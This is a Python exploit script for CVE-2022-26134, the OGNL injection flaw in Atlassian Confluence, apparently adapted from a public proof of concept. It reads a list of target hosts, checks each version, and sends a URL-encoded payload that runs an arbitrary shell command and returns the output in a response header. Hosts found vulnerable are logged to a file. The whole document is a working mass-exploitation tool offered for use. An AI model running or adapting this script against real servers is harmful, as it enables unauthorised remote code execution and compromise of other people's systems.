# -*- coding: utf-8 -*-

'''
original poc: https://github.com/Nwqda/CVE-2022-26134
'''

import requests
import re
import sys
import urllib3
urllib3.disable_warnings()

def check_target_version(host):
    try:
        response = requests.get("{}/login.action".format(host), verify=False, timeout=5)
        if response.status_code == 200:
            filter_version = re.findall("<span id='footer-build-information'>.*</span>", response.text)
            if(len(filter_version) >= 1):
                version = filter_version[0].split("'>")[1].split('</')[0]
                return version
            else:
                return False
        else:
            open('host.txt', 'a').write(target + '\n')
            return False
    except KeyboardInterrupt:
        exit('Bye.')
    except:
        return 'error'


def send_payload(host, command):
    try:
        response = requests.get("{}//login.action%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/".format(host, command), verify=False, allow_redirects=False, timeout=5)
        if(response.status_code == 302):
                try:
                    return response.headers['X-Cmd-Response']
                except:
                    return False
        else:
                return False
    except KeyboardInterrupt:
        exit('Bye.')
    except:
        return False
        

for target in open('list_confluence.txt').read().split('\n'):
    
    version = check_target_version(target)
    cmd = 'echo yuuki' # command
    
    if version == 'error':
        print(f'{target} | version: {version}')
        continue
    elif version:
        _versi = version
    else:
        _versi = 'Unknown'
    
    exec_payload = send_payload(target, cmd)
    if exec_payload:
        print(f'{target} | version: {_versi} | cmd response: \033[32;1m{exec_payload}\033[0m')
        open('conflunence.txt', 'a').write(target + '\n')
    else:
        print(f'{target} | version: {_versi} | not vulnerable')
